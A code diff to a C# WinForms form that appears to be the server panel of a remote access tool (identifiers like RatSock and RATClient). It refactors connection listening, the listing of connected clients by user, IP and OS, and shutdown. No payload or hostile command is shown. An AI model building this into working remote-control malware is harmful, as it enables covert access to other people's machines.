@@ -16,6 +16,7 @@ using System.Runtime.InteropServices;
 using DevComponents.DotNetBar;
 using DevComponents.UI;
 using DevComponents.WinForms;
+using WindowsFormsApplication1.Classes;
 namespace WindowsFormsApplication1
 {
     public partial class Main : RibbonForm
@@ -53,29 +54,35 @@ namespace WindowsFormsApplication1
 
             while (running)
             {
-                try
+
+                if (Connection.AcceptConnections(port))
                 {
-                    TCPListen = new TcpListener(System.Net.IPAddress.Any, port);
-                    TCPListen.Start();
-                    RatSock = TCPListen.AcceptSocket();
-                    IPEndPoint TCPEndPoint = (IPEndPoint)RatSock.RemoteEndPoint;
                     Connected++;
                     Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                     ListViewItem Item = new ListViewItem(IDNum.ToString(), ItemIndex);
                     ItemIndexList.Add(ItemIndex);
                     Invoke(new Action(() => listViewEx1.Items.Add(Item)));
                     Invoke(new Action(() => Item.SubItems.Add(Environment.UserName)));
-                    Invoke(new Action(() => Item.SubItems.Add(TCPEndPoint.Address.ToString())));
+                    Invoke(new Action(() => Item.SubItems.Add(Connection.GetIP(IDNum))));
                     Invoke(new Action(() => Item.SubItems.Add(Environment.OSVersion.ToString())));
-                    Thread RATClient = new Thread(() => Client(Item, IDNum));
-                    RATClient.Start();
-                    ItemIndex++;
+                    Thread StartListener = new Thread(() => Connection.StreamListener.Start(Convert.ToInt32(Item.Text)));
+                    StartListener.Start();
+                    IDNum++;
                 }
 
-                catch { }
-
+                foreach (int i in Connection.UpdateListView())
+                {
+                    MessageBox.Show(i.ToString());
+                    foreach (ListViewItem Item in listViewEx1.Items)
+                    {
+                        if (Convert.ToInt32(Item.Text) == i)
+                        {
+                            MessageBox.Show(Item.Text);
+                            Item.Remove();
+                        }
+                    }
+                }
             }
-
         }
 
         void Client(ListViewItem Item, int ID)
@@ -132,15 +139,14 @@ namespace WindowsFormsApplication1
         {
             if (switchButton1.Value == false)
             {
-                //Turn off &
-                //Cleanup
-                IDNum = 1;
                 running = false;
-                TCPListen.Stop();
-                RatSock.Close();
+                IDNum = 1;
+                Connected = 0;
                 listViewEx1.Items.Clear();
-                Classes.Connection.Disconnect(NSArray, SWArray, SRArray);
                 textBoxX1.Enabled = true;
+                label1.Text = "Connected: " + Connected;
+                Connection.StreamListener.StopAll();
+                Connection.Disconnect();
             }
 
             else
